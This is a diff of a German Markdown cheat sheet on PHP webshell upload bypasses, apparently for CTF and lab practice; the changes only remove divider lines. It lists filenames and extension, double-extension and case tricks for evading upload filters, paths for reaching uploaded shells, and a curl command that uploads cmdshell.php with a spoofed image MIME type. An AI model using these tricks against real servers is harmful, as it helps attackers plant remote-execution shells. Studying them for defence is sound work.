@@ -1,6 +1,6 @@
 # 🐚 PHP Webshell Upload Tricks & Bypasses
 
----
+
 
 ## Inhaltsverzeichnis
 - [Einleitung](#einleitung)
@@ -13,7 +13,7 @@
 - [Siehe auch](#siehe-auch)
 - [Haftungsausschluss](#haftungsausschluss)
 
---- 
+ 
 
 ## Einleitung
 
@@ -23,7 +23,7 @@ Solche Techniken sind besonders in **Capture The Flag (CTF)**-Challenges, **Bug 
 
 > ⚠️ Diese Datei dient ausschließlich zu **Lern- und Testzwecken** in legalen Übungsumgebungen (z. B. TryHackMe, HackTheBox).
 
----
+
 
 ## Klassische Upload-Namen für Webshells
 
@@ -37,7 +37,7 @@ cmdshell.php6
 cmdshell.inc
 ```
 
----
+
 
 <div align=right>
 
@@ -57,7 +57,7 @@ cmdshell.php;.jpg     # selten erlaubt, nutzt inkorrekte .htaccess oder MIME-Feh
 cmdshell.jpg.php
 ```
 
----
+
 
 ## Groß-/Kleinschreibung (Bypass durch Case-Insensitive Filter)
 
@@ -68,7 +68,7 @@ cmdshell.Php
 cmdshell.PHP
 ```
 
----
+
 
 ## Weitere gebräuchliche alternative Erweiterungen
 Diese Erweiterungen werden auf manchen falsch konfigurierten Servern ebenfalls als PHP interpretiert:
@@ -81,7 +81,7 @@ Diese Erweiterungen werden auf manchen falsch konfigurierten Servern ebenfalls a
 .php5
 .inc
 ```
----
+
 
 <div align=right>
 
@@ -98,7 +98,7 @@ http://[IP]/admin/uploads/cmdshell.phtml
 http://[IP]/images/cmdshell.php.jpg
 ```
 
----
+
 
 ## Nützliches Tool: Content-Disposition & MIME-Typ prüfen
 Manche Filter prüfen den MIME-Typ. Tools wie Burp Suite oder curl helfen dir, die Content-Type-Header zu manipulieren:
@@ -107,12 +107,12 @@ Manche Filter prüfen den MIME-Typ. Tools wie Burp Suite oder curl helfen dir, d
 curl -X POST -F "file=@cmdshell.php;type=image/jpeg" http://target/upload.php
 ```
 
----
+
 
 **💡 Hinweis:** 
 Wissen über Webshell-Uploadtricks hilft auch Defensive Security Teams, um Dateiuploads richtig abzusichern und forensisch zu analysieren.
 
----
+
 
 ## Siehe auch:
 
@@ -120,7 +120,7 @@ Wissen über Webshell-Uploadtricks hilft auch Defensive Security Teams, um Datei
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md)
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md](https://github.com/bitRaybytes/cybersecurity/blob/main/04-os-enumeration/post_exploitation_tools.md)
 
-----
+
 
 ## Haftungsausschluss
 
